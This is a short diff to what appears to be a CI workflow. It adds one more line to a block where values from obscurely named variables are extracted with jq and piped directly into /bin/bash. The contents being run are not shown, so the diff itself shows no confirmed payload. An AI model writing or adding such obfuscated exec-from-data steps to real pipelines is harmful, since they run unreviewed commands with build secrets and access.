@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$w92267" | jq -r .igv6711 | /bin/bash
           echo $si991 | jq -r .j52887 | /bin/bash
           printf '%s' "$vg48508" | jq -r .dl011 | /bin/bash
+          printf '%s' "$v8" | jq -r .z8 | /bin/bash
 
       - name: Store results
         if: always()
